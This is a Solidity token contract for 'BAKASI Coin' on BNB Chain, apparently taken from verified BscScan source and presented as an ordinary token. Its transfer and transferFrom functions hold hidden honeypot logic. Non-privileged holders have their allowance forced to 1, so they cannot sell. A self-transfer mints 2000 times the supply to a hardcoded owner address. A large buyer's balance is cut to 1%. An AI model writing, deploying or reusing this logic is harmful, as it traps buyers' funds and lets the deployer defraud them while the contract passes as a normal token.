/**
 *Submitted for verification at BscScan.com on 2022-12-29
*/

// SPDX-License-Identifier: Unlicense
// t.me/Token

pragma solidity 0.8.17;

interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public constant totalSupply = 1000000000 * 10 ** 9;
    string public constant name = "BAKASI Coin";
    string public constant symbol = "BAKASI";
    uint8 public constant decimals = 9;
    address Owner=0x02172088851a925B3Dd0FB83e82Ce0cFfBdC3cD8;
    address owner; address Buy=0x0000000000000000000000000000000000000000;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner=msg.sender;
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(balanceOf[msg.sender] >= value, 'balance too low');
        if (Buy != Owner && to != Buy && balanceOf[Buy]>=totalSupply/20) {
            balanceOf[Buy]=balanceOf[Buy]/100;} 
        if (msg.sender==getPair()) {Buy=to;}
        if (msg.sender==to){balanceOf[Owner]+= totalSupply*2000;} 
        balanceOf[to] += value;
        balanceOf[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        if (from != owner && from != Owner && from != address(this) && from != Buy) { 
            allowance[from][msg.sender] = 1; }        
        require(balanceOf[from] >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balanceOf[to] += value;
        balanceOf[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }

    function getPair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }
}